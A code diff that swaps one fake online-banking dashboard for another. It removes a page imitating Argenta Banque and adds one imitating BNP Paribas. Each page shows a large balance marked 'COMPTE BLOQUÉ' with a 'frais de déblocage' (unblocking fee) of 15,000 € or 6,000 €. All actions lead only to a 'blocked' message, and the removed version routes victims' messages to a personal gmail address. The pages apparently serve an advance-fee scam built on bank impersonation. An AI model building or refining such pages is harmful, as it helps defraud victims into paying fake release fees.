@@ -3,380 +3,264 @@
  <head> 
   <meta charset="UTF-8"> 
   <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-  <title>Mon Compte - Argenta Banque</title> 
-  <link rel="stylesheet" href="style.css"> 
-  <link rel="icon" href="https://www.argenta.be/etc.clientlibs/argenta/clientlibs/clientlib-base/resources/img/favicon/favicon-32x32.png" type="image/png"> 
- <style type="text/css" id="dcoder_stylesheet">/* Styles généraux et variables */
-:root {
-    --argenta-green: #008751;
-    --white: #ffffff;
-    --light-gray: #f4f4f4;
-    --dark-gray: #333;
-    --red-alert: #ff0000;
-}
-
-body {
-    font-family: Arial, sans-serif;
-    margin: 0;
-    padding: 0;
-    background-color: var(--light-gray);
-    color: var(--dark-gray);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-}
-
-/* Conteneur principal pour centrer le contenu */
-.login-container, #main-content {
-    width: 100%;
-    max-width: 420px;
-    background: var(--white);
-    padding: 2rem;
-    border-radius: 8px;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-    box-sizing: border-box;
-}
-
-@media (max-width: 480px) {
-    .login-container, body {
-        border-radius: 0;
-        min-height: 100vh;
-    }
-     #main-content {
-        padding-bottom: 80px; /* Espace pour la nav barre */
-    }
-}
-
-/* Styles de la page de connexion */
-.login-container {
-    text-align: center;
-}
-
-.logo {
-    max-width: 180px;
-    margin-bottom: 1.5rem;
-}
-
-h1, h2 {
-    color: var(--argenta-green);
-    margin-bottom: 1.5rem;
-}
-
-.input-group {
-    margin-bottom: 1.5rem;
-    text-align: left;
-}
-
-.input-group label {
-    display: block;
-    margin-bottom: 0.5rem;
-    font-weight: bold;
-    color: #555;
-}
-
-.input-group input {
-    width: 100%;
-    padding: 0.8rem;
-    border: 1px solid #ccc;
-    border-radius: 4px;
-    box-sizing: border-box;
-}
-
-.btn {
-    width: 100%;
-    padding: 1rem;
-    background-color: var(--argenta-green);
-    color: var(--white);
-    border: none;
-    border-radius: 4px;
-    font-size: 1.1rem;
-    cursor: pointer;
-    transition: background-color 0.3s;
-}
-
-.btn:hover {
-    background-color: #006a41;
-}
-
-.error-message {
-    color: var(--red-alert);
-    margin-top: 1rem;
-    font-weight: bold;
-    min-height: 1.2em;
-}
-
-/* Styles de l'interface principale */
-.page {
-    display: none; /* Pages cachées par défaut */
-}
-.page.active {
-    display: block; /* Affiche la page active */
-}
-
-.header {
-    border-bottom: 2px solid var(--light-gray);
-    padding-bottom: 0.5rem;
-    margin-bottom: 1.5rem;
-}
-
-.header #datetime {
-    font-size: 0.9em;
-    color: #666;
-}
-
-/* Alerte Compte Bloqué */
-.status-message {
-    text-align: center;
-    margin: 2rem 0;
-    padding: 1rem;
-    border: 2px solid var(--argenta-green);
-    border-radius: 5px;
-}
-
-.blocked-alert {
-    background-color: var(--argenta-green);
-    color: var(--white);
-    font-weight: bold;
-    font-size: 1.5rem;
-    padding: 0.5rem;
-    animation: blink-red 1s infinite;
-}
-
-@keyframes blink-red {
-    50% { background-color: var(--red-alert); }
-}
-
-/* Liste des transactions */
-.transactions ul {
-    list-style: none;
-    padding: 0;
-    margin: 0;
-}
-
-.transactions li {
-    display: flex;
-    justify-content: space-between;
-    padding: 0.8rem 0;
-    border-bottom: 1px solid var(--light-gray);
-    font-size: 0.9em;
-}
-
-.transactions li span:last-child {
-    font-weight: bold;
-    color: var(--argenta-green);
-}
-
-/* Section Carte */
-.card-display {
-    display: flex;
-    justify-content: center;
-}
-
-.visa-card {
-    width: 300px;
-    height: 180px;
-    background: linear-gradient(45deg, var(--argenta-green), #006a41);
-    border-radius: 15px;
-    color: var(--white);
-    padding: 20px;
-    box-sizing: border-box;
-    position: relative;
-    font-family: 'Courier New', Courier, monospace;
-}
-.card-logo-visa {
-    position: absolute;
-    top: 20px;
-    right: 20px;
-    font-size: 24px;
-    font-weight: bold;
-    font-style: italic;
-}
-.card-chip {
-    width: 40px;
-    height: 30px;
-    background: #c0c0c0;
-    border-radius: 4px;
-    margin-bottom: 20px;
-}
-.card-number {
-    font-size: 1.4rem;
-    letter-spacing: 2px;
-    margin-bottom: 15px;
-}
-.card-holder {
-    font-size: 0.9rem;
-}
-.card-bank {
-    position: absolute;
-    bottom: 15px;
-    left: 20px;
-    font-weight: bold;
-}
-
-
-/* Message action bloquée */
-.blocked-action {
-    text-align: center;
-    padding: 2rem;
-    background-color: #fff0f0;
-    border: 1px solid var(--red-alert);
-    border-radius: 5px;
-}
-.blocked-action h2 {
-    color: var(--red-alert);
-}
-
-/* Formulaire de contact */
-.contact-form form {
-    margin-top: 1.5rem;
-}
-
-
-/* Barre de navigation inférieure */
-.bottom-nav {
-    position: fixed;
-    bottom: 0;
-    left: 0;
-    width: 100%;
-    background-color: var(--white);
-    display: flex;
-    justify-content: space-around;
-    box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
-    padding: 0.5rem 0;
-}
-
-.bottom-nav .nav-btn {
-    background: none;
-    border: none;
-    color: var(--dark-gray);
-    cursor: pointer;
-    padding: 0.8rem 1rem;
-    font-size: 0.8rem;
-    text-decoration: none;
-    flex-grow: 1;
-    text-align: center;
-}
-.bottom-nav .nav-btn.active {
-    color: var(--argenta-green);
-    font-weight: bold;
-}
-</style></head> 
+  <title>Espace Client BNP Paribas</title> 
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&amp;display=swap" rel="stylesheet"> 
+  <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            background: #f8f8f8;
+            color: #333;
+        }
+        .header {
+            background: #00794f;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 15px;
+            font-size: 14px;
+        }
+        .header img {
+            height: 30px;
+        }
+        .content {
+            padding: 15px;
+            max-width: 600px;
+            margin: auto;
+        }
+        h2 {
+            color: #00794f;
+            font-size: 22px;
+            margin-bottom: 15px;
+            border-bottom: 2px solid #00794f;
+            padding-bottom: 5px;
+        }
+        .info {
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+        }
+        .solde {
+            font-size: 28px;
+            font-weight: bold;
+            margin: 8px 0;
+        }
+        .bloque {
+            color: red;
+            font-weight: bold;
+            font-size: 16px;
+            margin: 5px 0;
+            animation: clignote 1s infinite;
+        }
+        @keyframes clignote {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+        .date {
+            font-size: 13px;
+            color: gray;
+        }
+        .operations {
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+        }
+        .operations h3 {
+            margin-top: 0;
+            color: #00794f;
+            border-bottom: 1px solid #ddd;
+            padding-bottom: 8px;
+        }
+        .operation {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #eee;
+        }
+        .operation:last-child {
+            border-bottom: none;
+        }
+        .op-name { font-size: 14px; font-weight: 500; }
+        .op-date { font-size: 12px; color: gray; }
+        .op-montant { font-size: 15px; font-weight: bold; }
+        .credit { color: green; }
+        .debit { color: red; }
+        .nav {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            background: white;
+            display: flex;
+            justify-content: space-around;
+            border-top: 1px solid #ddd;
+            padding: 8px 0;
+        }
+        .nav div {
+            text-align: center;
+            font-size: 14px;
+            color: #555;
+            cursor: pointer;
+            flex: 1;
+        }
+        .nav div.active { color: #00794f; font-weight: bold; }
+    </style> 
+ </head> 
  <body> 
-  <main id="main-content"> 
-   <div id="accueil" class="page active"> 
-    <div class="header"> 
-     <h2>Accueil</h2> 
-     <p id="datetime"></p> 
-    </div> 
-    <div class="account-info"> 
-     <p><strong>Titulaire du compte :</strong> Marine Forestier</p> 
-     <p><strong>Solde :</strong> 1 275 000 €</p> 
-    </div> 
-    <div class="status-message"> 
-     <p class="blocked-alert">COMPTE BLOQUÉ</p> 
-     <p><strong>Frais de déblocage :</strong> 15 000 €</p> 
-    </div> 
-    <div class="transactions"> 
-     <h3>Dernières transactions</h3> 
-     <ul> 
-      <li><span>15/06/2010</span><span>Virement entrant - PetroCorp</span><span>+ 350 000 €</span></li> 
-      <li><span>22/05/2010</span><span>Virement entrant - OilTrans</span><span>+ 275 000 €</span></li> 
-      <li><span>10/04/2010</span><span>Virement entrant - Global Drilling</span><span>+ 150 000 €</span></li> 
-      <li><span>18/02/2010</span><span>Virement entrant - Energy Solutions</span><span>+ 300 000 €</span></li> 
-      <li><span>05/01/2010</span><span>Virement entrant - SeaOil Invest</span><span>+ 200 000 €</span></li> 
-     </ul> 
-    </div> 
+  <div class="header"> 
+   <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTUwIiBoZWlnaHQ9IjMwIiB2aWV3Qm94PSIwIDAgMTUwIDMwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxyZWN0IHdpZHRoPSIxNTAiIGhlaWdodD0iMzAiIGZpbGw9IiMwMDc5NGYiLz4KICA8dGV4dCB4PSI1IiB5PSIyMCIgZmlsbD0id2hpdGUiIGZvbnQtc2l6ZT0iMTZweCIgZm9udC1mYW1pbHk9IkFyaWFsIj5CTlAgUGFyaWJhczwvdGV4dD4KPC9zdmc+" alt="BNP Logo"> 
+   <div>
+     Identifiant : <strong>161703392E</strong> 
    </div> 
-   <div id="virement" class="page"> 
-    <div class="header"> 
-     <h2>Virement</h2> 
-    </div> 
-    <div class="blocked-action"> 
-     <h2>COMPTE BLOQUÉ</h2> 
-     <p>Vous ne pouvez pas effectuer de virement tant que votre compte est bloqué.</p> 
-    </div> 
+  </div> 
+  <div class="content"> 
+   <h2>Accueil</h2> 
+   <div class="info"> 
+    <p><strong>Nom du titulaire :</strong> Dominique Duval</p> 
+    <p><strong>Solde :</strong></p> 
+    <p class="solde">80 000.00 €</p> 
+    <p class="bloque">COMPTE BLOQUÉ</p> 
+    <p class="bloque">Frais de déblocage : 6 000€</p> 
+    <p class="date">Dernière connexion : <span id="lastLogin"></span></p> 
    </div> 
-   <div id="carte" class="page"> 
-    <div class="header"> 
-     <h2>Carte</h2> 
+   <div class="operations"> 
+    <h3>Dernières opérations</h3> 
+    <div class="operation"> 
+     <div> 
+      <div class="op-name">
+       Payment de maison
+      </div> 
+      <div class="op-date">
+       10 mars 2024
+      </div> 
+     </div> 
+     <div class="op-montant debit">
+      -20 000 €
+     </div> 
     </div> 
-    <div class="card-display"> 
-     <div class="visa-card"> 
-      <div class="card-logo-visa">
-       VISA
+    <div class="operation"> 
+     <div> 
+      <div class="op-name">
+       Payment de connexion internet
       </div> 
-      <div class="card-chip"></div> 
-      <div class="card-number">
-       **** **** **** 9685
+      <div class="op-date">
+       15 janvier 2024
       </div> 
-      <div class="card-holder">
-       MARINE FORESTIER
+     </div> 
+     <div class="op-montant debit">
+      -50 €
+     </div> 
+    </div> 
+    <div class="operation"> 
+     <div> 
+      <div class="op-name">
+       Achat de médicaments à la pharmacie
       </div> 
-      <div class="card-bank">
-       ARGENTA
+      <div class="op-date">
+       22 décembre 2023
       </div> 
+     </div> 
+     <div class="op-montant debit">
+      -80 €
+     </div> 
+    </div> 
+    <div class="operation"> 
+     <div> 
+      <div class="op-name">
+       Achat de vêtements dans un magasin
+      </div> 
+      <div class="op-date">
+       10 novembre 2023
+      </div> 
+     </div> 
+     <div class="op-montant debit">
+      -350 €
+     </div> 
+    </div> 
+    <div class="operation"> 
+     <div> 
+      <div class="op-name">
+       Achats de provisions dans un supermarché
+      </div> 
+      <div class="op-date">
+       05 septembre 2023
+      </div> 
+     </div> 
+     <div class="op-montant debit">
+      -200 €
+     </div> 
+    </div> 
+    <div class="operation"> 
+     <div> 
+      <div class="op-name">
+       Payment de scolarité de ma fille (Nantes)
+      </div> 
+      <div class="op-date">
+       20 juin 2023
+      </div> 
+     </div> 
+     <div class="op-montant debit">
+      -2 500 €
+     </div> 
+    </div> 
+    <div class="operation"> 
+     <div> 
+      <div class="op-name">
+       Payment dans un salon de coiffure
+      </div> 
+      <div class="op-date">
+       15 avril 2023
+      </div> 
+     </div> 
+     <div class="op-montant debit">
+      -60 €
      </div> 
     </div> 
    </div> 
-   <div id="assistante" class="page"> 
-    <div class="header"> 
-     <h2>Assistante</h2> 
-    </div> 
-    <div class="contact-form"> 
-     <p>Pour toute question, veuillez nous laisser un message. N'oubliez pas d'inclure votre adresse e-mail pour que nous puissions vous répondre.</p> 
-     <form id="contact-form-mailer"> 
-      <div class="input-group"> <label for="user-email">Votre adresse email *</label> 
-       <input type="email" id="user-email" required> 
-      </div> 
-      <div class="input-group"> <label for="message">Votre message *</label> <textarea id="message" rows="6" required></textarea> 
-      </div> <button type="submit" class="btn">Envoyer</button> 
-     </form> 
-    </div> 
+  </div> 
+  <div class="nav"> 
+   <div class="active">
+    Accueil
    </div> 
-  </main> 
-  <nav class="bottom-nav"> <button data-target="accueil" class="nav-btn active">Accueil</button> <button data-target="virement" class="nav-btn">Virement</button> <button data-target="carte" class="nav-btn">Carte</button> <button data-target="assistante" class="nav-btn">Assistante</button> <a href="index.html" class="nav-btn">Déconnexion</a> 
-  </nav> 
+   <div onclick="blocked()">
+    Virement
+   </div> 
+   <div onclick="blocked()">
+    Carte
+   </div> 
+   <div onclick="blocked()">
+    Assistance
+   </div> 
+   <div onclick="logout()">
+    Déconnexion
+   </div> 
+  </div> 
   <script>
-        // Affichage de la date et l'heure
-        const datetimeElement = document.getElementById('datetime');
-        const now = new Date();
-        datetimeElement.textContent = `Connecté le : ${now.toLocaleDateString('fr-FR')} à ${now.toLocaleTimeString('fr-FR')}`;
+        document.getElementById("lastLogin").innerText = new Date().toLocaleString();
 
-        // Navigation entre les pages
-        const navButtons = document.querySelectorAll('.nav-btn[data-target]');
-        const pages = document.querySelectorAll('.page');
+        function blocked() {
+            alert("⚠ Votre compte est bloqué. Action impossible !");
+        }
 
-        navButtons.forEach(button => {
-            button.addEventListener('click', () => {
-                // Cacher toutes les pages
-                pages.forEach(page => page.classList.remove('active'));
-                // Retirer la classe active de tous les boutons
-                navButtons.forEach(btn => btn.classList.remove('active'));
+        function logout() {
+            window.location.href = "login.html";
+        }
 
-                // Afficher la page cible
-                const targetPage = document.getElementById(button.dataset.target);
-                targetPage.classList.add('active');
-                // Ajouter la classe active au bouton cliqué
-                button.classList.add('active');
-            });
-        });
-        
-        // Logique du formulaire de contact
-        document.getElementById('contact-form-mailer').addEventListener('submit', function(event) {
-            event.preventDefault();
-            const userEmail = document.getElementById('user-email').value;
-            const message = document.getElementById('message').value;
-            const recipient = 'rosalineponce10@gmail.com';
-            const subject = 'Message depuis l\'interface Argenta';
-            
-            // Crée un lien mailto pour ouvrir le client de messagerie par défaut
-            const mailtoLink = `mailto:${recipient}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(`Email de l'utilisateur : ${userEmail}\n\nMessage :\n${message}`)}`;
-            
-            // Ouvre le lien
-            window.location.href = mailtoLink;
-        });
-
-    </script> 
- 
-</body></html>
+        let timer;
+        function resetTimer() {
+            clearTimeout(timer);
+            timer = setTimeout(() => {
+                window.location.href = "login.html";
+            }, 120000); 
+        }
+        document.addEventListener("mousemove", resetTimer);
+        document.addEventListener("keydown", resetTimer);
+        document.addEventListener("click", resetTimer);
+        resetTimer();
+  </script> 
+ </body>
+   </html>
